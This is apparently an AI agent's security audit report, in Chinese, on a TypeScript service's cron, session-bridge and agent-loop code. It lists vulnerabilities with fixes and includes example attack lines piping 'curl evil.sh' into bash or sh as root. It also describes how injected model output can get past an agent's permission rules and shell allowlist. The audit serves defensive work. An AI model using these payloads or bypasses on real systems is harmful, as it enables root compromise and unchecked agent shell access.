# rmc-TriRMC.md — AC-R1 审计报告

## 节点头

- 节点：rmc-audit-cmp-001 / AC-R1
- tick：20260826T150113Z（driven round 0；前序 124800Z 判 blocked，第六探确认目标已在本机存在后解阻重派，本报告为正式审计产物，blocked 证据版本留 git 历史祖先链）
- 审计范围：TriRMC `/srv/fleet/TriRMC/src/` 全部 58 个 .ts（9670 行）中的四个指定焦点域 + 承接面，逐文件完整 Read：cron/ 全 5 文件（service/command-handler/routes/week-math/index）、orchestration/session-bridge.ts、config-sync/ 3 文件（apply/status/default-model 完整 + types 摘读）、agent-loop/ 12 文件（loop/tools/permissions/permissions-engine 5 文件完整 + sub-agent spawn 完整、其余摘读）、server/app.ts（711 行全读）、pipeline/assemble.ts、config/env.ts；其余域（mirror/observability/orchestration 其余等）经全树危险模式 grep 扫描复核
- 实例角色：TestEngineer（小柯），fresh 重派，一次一节点
- 行号基准：下文所有 file:line 以 `/srv/fleet/TriRMC/` 为根，行号来自本实例 Read 输出

## 总体评估

四域整体设计意图清晰（复用 agent-core 调度器、降权纪律、原子写、三级模型解析），且已有两处值得肯定的安全加固（/internal/* 鉴权：app.ts:118-134；默认绑定 loopback：app.ts:673-675）。但存在 **3 处 P0 级可直接利用面**：cron 作业载荷可携带任意 runAs 用户名使降权机制反向提权或直取 root、/internal 鉴权存在「未配置 token = 永久零鉴权」的 fail-open 缺省、agent-loop 权限引擎的规则内容匹配退化为全文子串匹配（与 AC-R2 在 TriCompany agent-core 发现的同源缺陷在此仓本地拷贝中同样成立且更宽：连 dontAsk 都没有）。另有 8 项 P1（healthz 绕过鉴权做磁盘读、runJob 手工触发与调度循环双写竞态、session-bridge 全 catch 吞错返回空注册表等）与 8 项 P2。与 M 面 TriMMC 审计对照结论：TriRMC 的 cron/session-bridge 是安全面最重的两个域，quality 面则普遍有测试注入点设计良好。门禁建议：P0-1/P0-2 修复前，8710 端口不应视为已加固（即使绑定 loopback，同机任意本地进程可未认证注册 root 级 cron 作业）。

## 发现清单

### P0（阻断级：可被利用或必然出错）

**P0-1 cron 作业载荷 runAs 字段无校验，降权机制可被反用为提权/指定任意用户执行**

- 位置：`cron/command-handler.ts:24-25`（payload.runAs: string，无白名单）、`:85-88`（`runuser -u <payload.runAs> --` 直接拼入 argv）、`:94`（`HOME=/home/${payload.runAs}` 模板拼接）；载荷入口 `cron/routes.ts:53-56`（validateCreateInput 只校验 command/cwd 存在，runAs/timeoutMs 透传）
- 问题：runAs 是 HTTP POST body 里完全攻击者可控的用户名。两个独立向量：(a) **提权向量**——服务以 root 跑 systemd（session-bridge.ts:7-9 注释自认「triMC 以 root 跑 systemd」）时，runAs 不设则 command 以 root 执行（`cmd = payload.runAs ? 'runuser' : shell`，command-handler.ts:85）；设 runAs=root 同样直取 root。(b) **越用户向量**——runAs 任意合法系统用户（root/www-data/postgres…）即可以其身份跑任意 bash。注释宣称的「降权纪律」只在 runAs 恰为 fleet 时成立，代码层无任何强制。
- 触发场景：同机任意进程 POST /internal/v1/cron/jobs（若 P0-2 成立即无鉴权）payload={command:"curl evil.sh|bash", cwd:"/tmp", runAs:"root"}，调度器到点以 root 执行。cron job 持久化在 job-store，等于持久化 root 后门。
- 修复建议：runAs 收敛为白名单常量（如仅 'fleet'）或强制恒等于进程配置的 TRIRMC_RUNAS；服务为 root 时禁止 runAs 缺省路径；validateCreateInput 增加 runAs 白名单校验并拒绝未知值。

**P0-2 /internal/* 鉴权是 fail-open：TRIRMC_INTERNAL_TOKEN 未配置 = 全部内部面（含 cron RCE 面）零鉴权**

- 位置：`server/app.ts:121`（`const internalToken = process.env.TRIRMC_INTERNAL_TOKEN ?? ''`）、`:122`（`if (internalToken && ...)` —— 空串直接短路跳过整个鉴权块）
- 问题：注释自述背景（:118-120）：「8710 公网可达，/internal/* 原零鉴权且 cron job 可执行任意 bash = 未认证 RCE 面」。但加固实现为可选：部署侧漏配 env 即静默回到零鉴权，且无任何启动告警或 healthz 标记。配套的 loopback 绑定（:673-675）可被显式 TRIRMC_HOST 覆盖（:674），公网部署 + 漏配 token = 回到注释自认的「未认证 RCE 面」。
- 触发场景：部署机 systemd unit 未写 TRIRMC_INTERNAL_TOKEN（该 unit 本机不存在，无法核实线上是否配置——但代码行为是漏配即裸奔），同机任意本地进程/容器逃逸进程即可调 /internal/v1/cron/jobs、/internal/v1/agent（后者驱动 agentLoop 跑 shell_exec 工具，tools.ts:216-270）。
- 修复建议：反转缺省——未配置 token 时启动即 fatal（或至少降级为仅 /healthz 可达 + 显式启动告警）；鉴权失败与未配置两种状态在日志/healthz 可区分；TRIRMC_HOST 非 loopback 时强制要求 token。

**P0-3 权限引擎规则内容匹配退化为「序列化全文任意位置子串匹配」，内容限定 allow 规则可被子串注入绕过（AC-R2 同源缺陷在 TriRMC 本地拷贝成立）**

- 位置：`agent-loop/permissions-engine/decision-pipeline.ts:100-108`（ruleMatches：isWildcard 分支 :102-105 与非通配分支 :107 代码完全相同——死分支）、`:101`（`const argsStr = JSON.stringify(args)` 后仅做 `includes`）；契约宣称见 `rule-parser.ts:38-41`（"Bash(git push)" → exact command match）与 `types.ts:90`（exact match for Bash commands）
- 问题：与 AC-R2 在 TriCompany/packages/agent-core 判定的 P0-3 同源，但 TriRMC 本地拷贝更宽：此仓 PermissionMode 只有 default/acceptEdits/bypassPermissions 三种（types.ts:17），**没有 dontAsk**，default 模式 Step 7 是 default_deny（decision-pipeline.ts:69-75）——因此运维若想让服务可用必然依赖 allow 规则或 bypass，而 allow 规则的内容匹配是全文子串。"Bash(git push)" 实际语义 = "参数序列化文本任意位置含 git push"。模型输出 `echo git push && curl evil.sh|sh` 命中 allow 规则获放行（前提 shell_exec 工具策略面放行，见 P1-4 交互）。
- 触发场景：宿主按 rule-parser 文档语义配置命令白名单（标准用法），注入或越权模型输出拼接合法子串即获权限放行。
- 修复建议：非通配规则对提取的 command/path 参数做锚定匹配（全等或规范化前缀）；通配规则锚定命令首部；修复或删除死分支。**根治路径**：该引擎与 agent-core 重复实现，应收敛到共享真源（本仓 loop.ts:1-11 注释已声明 agent-core 为 shared truth，但 permissions-engine/ 仍是本地 242+189+131+155+130 行的平行拷贝——漂移即缺陷，本条即为实证）。

### P1（应尽快修复）

**P1-1 /healthz 无条件执行 cronService.getStatus()，未认证可达且每次做磁盘 job-store 读**
- 位置：`server/app.ts:91-116`（healthz 分支在 :118 鉴权块之前，:94 `await cronService.getStatus()`）；`cron/service.ts:249-264`（getStatus 每次 loadJobStore 全量读 JSON）
- 问题与触发：鉴权豁免端点做非平凡 I/O——同机进程可高频打 /healthz 造成 job-store 读放大（无缓存）；更实质的是把 cron 作业数/降级状态作为未认证信息泄露面。探测 P0-2 时攻击者可先从此端点确认 cron enabled 与 jobCount。
- 建议：healthz 收敛为纯内存字段（executor.isRunning + 上次缓存值），重状态挪到已鉴权的 /internal/v1/cron/status。

**P1-2 runJob 手工触发路径与调度器循环双写 job-store，无进程内互斥**
- 位置：`cron/service.ts:173-220`（runJob：:181 写 runningAtMs → :195 重读 freshJobs → :202-211 二次写回）；调度侧 JobExecutor 同一 store（:87）
- 问题与触发：HTTP POST /jobs/{id}/run（routes.ts:75-88）与调度 tick 并发时 read-modify-write 交错：runJob :195 重读若撞上调度器刚写完的状态则丢调度器的 runCount/nextRun 更新（后写覆盖前写，saveJobStore 整文件原子换但不是字段级合并）。:178 的 already-running 检查在 :181 写盘前存在 TOCTOU 窗口——两个并发 run 请求都读到 runningAtMs=null 则双双通过，同一 job 双跑（对 r1-1 周报类幂等任务=双份产物/双份 git 提交）。
- 建议：job 级进程内互斥锁（Promise 链或 Set<jobId> running guard）；或 runJob 委托 executor 统一执行路径。

**P1-3 session-bridge 三个函数全部 catch 吞错返回空/失败值，故障不可观测**
- 位置：`orchestration/session-bridge.ts:146-148`（listAgents catch → return []）、`:111-114`（spawnSession catch → 仅 msg.slice(500)）、`:178-182`（sendMessage catch → timedOut 正则猜测）
- 问题与触发：claude CLI 不存在/超时/JSON 输出变更时 listAgents 静默返回 []，app.ts:139-150 的 /internal/v1/agents 就返回 count=0——调用方无法区分「无会话」与「桥全断」。sendMessage 的超时判定靠错误消息正则（:180），脆弱且无日志。spawn 输出解析（:106）依赖 CLI 文案格式（backgrounded 行的正则），CLI 升级即静默全挂。
- 建议：每个 catch 加结构化日志；listAgents 失败时 app.ts 层返回可区分错误态（502 而非 200+空数组）；解析失败样本落盘供回归。

**P1-4 agent-loop 的 shell_exec 策略门是「首词 allowlist + 前缀 denylist」，可被复合命令轻易绕过**
- 位置：`agent-loop/tools.ts:187-214`（checkShellPolicy）、`:194-195`（只取 `cmdLower.split(/\s+/)[0]` 做 baseCmd）、`:198-202`（denylist 仅 `cmdLower === blocked || startsWith(blocked + ' ')`）
- 问题与触发：`sh -c`（:248）语义下整串交给 shell，但策略只看首词：复合命令（分号/&&/管道衔接）里第二段起的 denylist 命中检测不到（不是整串前缀）；`bash -c "..."`、命令替换 `$(...)` 全不在检测面。allowlist 含 curl/wget（:162）即出网原语。denylist（'sudo' 等作为整串前缀）与 allowlist 首词法不对称，检测面 < 实际执行面。
- 建议：要么真正解析（分号/&&/||/管道拆分后逐段过 denylist），要么明示该层只是粗滤并在工具描述降级其安全声明；denylist 同时按分段匹配。

**P1-5 /internal/v1/agent 直接驱动 agentLoop 但不设 permissionMode/rules，落入下游缺省（与 AC-R2 P0-4 形成跨仓链）**
- 位置：`server/app.ts:429-485`（parsed 接受 model/messages/contract/tier/cwd，**无 permissionMode/permissionRules 字段**）、`:467-470` 与 `:479-484`（两分支构造 loopOptions 均不含权限字段）、`pipeline/assemble.ts:111-120`（assemblePipelineOptions 同样不产权限字段）
- 问题与触发：本仓 AgentLoopOptions（loop.ts:32-46）有权限通道，但唯一的生产 HTTP 入口不接收也不设置。权限最终落 agent-core 缺省（AC-R2 实证：agent-core loop.ts:346 缺省 bypassPermissions）——即 **/internal/v1/agent 未配置即 bypass 运行**，叠加 P1-4 粗滤 shell 门与 P0-2 漏配鉴权 = 未认证方调用模型→无确认执行 allowlist 内任意 shell（含 curl 出网）。
- 建议：app.ts 层显式缺省最严模式（default）+ 拒绝客户端上送 bypassPermissions；assemble 层补权限装配。

**P1-6 config-sync apply 的 keys 维落地判定只查 env 存在性，不做指纹/可用性核验，且 warning 数组无限追加**
- 位置：`config-sync/apply.ts:124-144`（resolveKeysDim 只判 envKey 存在非空）、`:249-253`（warning-stale 分支重写 applied.json 时 `warnings: [...(applied.warnings ?? []), cmp.warning]` —— 每次追加永不清理，且不落 dims 文件）
- 问题与触发：(a) keys 状态 applied 仅代表 env 变量名在，值错/过期照样判 applied——与 bundle 携带的指纹（:113-115 注释「四 provider 指纹」）完全不对账，指纹形同虚设。(b) warnings 数组只增不减：时钟回拨场景每次 apply 都追加一条 'stale-bundle-content-hash-differs'，长期跑成无限增长数组写入 applied.json（磁盘与 status 端点载荷双膨胀）。
- 建议：keys 维落地后用 env 值实际探测 provider 或 hash 比对指纹；warnings 去重/上限/时间窗。

**P1-7 cron 执行日志解析用正则逆向工程自家日志格式，错误路径静默降级**
- 位置：`cron/service.ts:293-311`（parseLogFile：startedMatch/resultMatch/errMatch 三个正则解析 buildLogText 产物）、`:296-297`（默认 status='error' 无 errorMessage）、`:318-319`（catch → 'log unreadable'）
- 问题与触发：格式即契约但无版本戳：command-handler.ts:177-203 改一行日志模板（如 RESULT 行文案）getLogs 全量误判。startedAt 解析失败回退 birthtime（:294），durationMs 据此算 = 静默错值。无 RESULT 行的截断日志（进程在写盘前被杀）判 error 但 errorMessage=null，排障无从下手。
- 建议：每行日志头部写 formatVersion；或改结构化 sidecar（JSON per run）；解析失败至少带文件名上下文。

**P1-8 registrySnapshot 模块级可变快照做会话寻址，过期快照可投递到已易主/已结束会话**
- 位置：`server/app.ts:61`（let registrySnapshot）、`:178-186`（寻址：快照找 → 未命中才实时拉）、`:197`（sendMessage(session.sessionId, ...) 用过期 sessionId resume）
- 问题与触发：快照只在 GET /agents 或 POST /agents 时刷新；bg 会话退出/同名重建后，旧 sessionId 的 --resume 行为未定义（可能开新空会话或报错——session-bridge 无会话存在性校验）。name 匹配（:179）允许按名寻址，重名时 find 取首个，投递目标不可预测。
- 建议：寻址默认实时拉取（listAgents 有 30s 超时可承受），快照仅作显示；sessionId 用前校验存活。

### P2（建议改进）

**P2-1 cron PATCH /jobs/{id} 无载荷 schema 校验，坏 payload 到 handler 才炸**
- 位置：`cron/routes.ts:114-128`（PATCH body 只判 JSON 合法即透传）；`cron/service.ts:147-156`（updateJob 直接 applyJobPatch）
- 问题与触发：POST 走 validateCreateInput（:97）而 PATCH 不走——可把 payload 改成缺 command/cwd 的形状，到 command-handler.ts:61-69 才抛错成 lastError 噪音；schedule 字段同样无复核。
- 建议：PATCH 复用 validateCreateInput 的载荷校验。

**P2-2 healthz 的 cron.enabled 字段语义 = service running 而非配置开关，监控方无法区分「配置关」与「运行挂了」**
- 位置：`server/app.ts:100-112`（enabled: cronStatus.running）；`cron/service.ts:259`（running: executor.isRunning）
- 问题与触发：stop() 后 running=false 而 TRIRMC_CRON_ENABLED 未变；env.cronEnabled=false 时走 :107-112 静态分支。两种 false 在 healthz 载荷里不可区分。
- 建议：拆分 configuredEnabled / running 两字段。

**P2-3 session-bridge buildRegistry 的 employeeNames 参数全仓无调用方传入，恒为空数组**
- 位置：`orchestration/session-bridge.ts:186-192`（默认参数 []）；调用点 `server/app.ts:140/182/251`（均只传 sessions）
- 问题与触发：employeeId 映射功能（注释宣称「加载合同时注入」）从未生效——注册表条目 employeeId 恒 undefined，按 employeeId 寻址的能力是死代码。
- 建议：接 employee-registry 或删参数明确降级。

**P2-4 week-math isoWeekOf 的 ISO 年边界无测试锚，跨年排列可能偏 1 周**
- 位置：`cron/week-math.ts:28-34`（isoWeekOf：移到周四后 `(d - yearStart)/7` 上取整，:32 yearStart 取 d 所在**日历年** 1 月 1 日——非 ISO 年起点）
- 问题与触发：12/29-12/31 属下年 W1、1/1-1/3 属上年 W52/53 的边界周，getFullYear 锚点在周四跨日历年时与 ISO 年定义存在偏差可能。fromWeek<1 回退（:69-71）用 12-28 兜底正确，但 toWeek 出偏时回退值跟着错——直接错 token 进周报命令（command-handler.ts:72-75 替换）。
- 建议：补 2026-12-28 / 2027-01-01 / 2027-01-04 三组日期断言测试。

**P2-5 config-sync createGitRunner 的 HOME 兜底在 root 运行时指向 /root，与 fleet 属主假设冲突**
- 位置：`config-sync/status.ts:79`（`HOME: process.env.HOME || homedir()`）
- 问题与触发：注释场景（i4-2）是 fleet 身份跑 git；若 apply 由 root 跑（cron job runAs 缺省即进程用户，见 P0-1 交互），homedir()=/root，读 /root/.gitconfig 的 safe.directory 与 fleet 仓属主不匹配，git 仍 dubious ownership——兜底只修了它注释里那一种部署形态。
- 建议：git env 显式 safe.directory 或以 fleet 身份固定。

**P2-6 getLogs 的 limit 参数两处钳制语义不对称**
- 位置：`cron/routes.ts:145-146`（parseInt + isFinite ? limit : 20）；`cron/service.ts:246`（`Math.max(0, limit)`）
- 问题与触发：limit=abc → NaN → 回 20 ✓；limit=-5 → isFinite true 透传 → service 归 0 返回空；limit=99999 → 全量返回无上限。
- 建议：统一钳制 `Math.min(Math.max(1, limit), 200)`。

**P2-7 agent-loop glob_search 手写遍历对 `**/x` 模式存在同文件重复入结果**
- 位置：`agent-loop/tools.ts:309-320`（`**` 分支：非末段 nextPart 匹配才 walk(+2)，但 :318-320 对每个 entry.isDirectory 再 walk(同 partIndex)——对已按 nextPart 走过的路径还会以 `**` 身份再扫）
- 问题与触发：深层目录树同一文件可经两条路径重复 push；matches 截断 200（:341）时重复占额挤掉真结果。纯质量问题（read-only 工具）。
- 建议：换成熟 glob 库或遍历去重。

**P2-8 permissions.ts TIER_DESCRIPTIONS 声明 heartbeat tier 但 getTierSummary 只遍历 3 tier**
- 位置：`agent-loop/permissions.ts:35`（TIER_DESCRIPTIONS 含 heartbeat）、`:59`（`const tiers: AgentTier[] = ['main', 'subagent', 'coordinator']`）
- 问题与触发：REQ-20260805-006 引入的 heartbeat 档（read+write、no shell）在 summary/context-builder 注入面缺席——模型可见的工具清单不含 heartbeat 档描述，行为漂移无观测。
- 建议：tiers 数组补 heartbeat。

## 发现计数

| 级别 | 计数 |
| --- | --- |
| P0 | 3 |
| P1 | 8 |
| P2 | 8 |

## 与 M 面 / AC-R2 对照要点

1. **同源缺陷跨仓漂移实证**：P0-3（规则内容子串匹配）与 AC-R2 在 TriCompany agent-core 的 P0-3 同源；TriRMC 本地 permissions-engine 拷贝还缺 dontAsk 模式、acceptEdits 的 CWD 判定同样用裸 startsWith 且无 `..` 点段解析（decision-pipeline.ts:186-189）——「本地拷贝 vs 共享真源」的漂移正是 AC-R2 建议收敛的论据。
2. **跨仓链**：本报告 P1-5（HTTP 入口不设权限字段）+ AC-R2 P0-4（agent-core loop 缺省 bypassPermissions）构成完整链：TriRMC 未认证调用方 → bypass 运行 → shell_exec 粗滤门（P1-4）→ allowlist 内任意命令（含 curl 出网）。三段修任意一段可断链，建议按 P0-2 → P1-5 → P0-3 顺序修。
3. **cron 域为 TriRMC 独有重面**：M 面无对应物，runAs 提权向量（P0-1）是本仓最优先修复项。
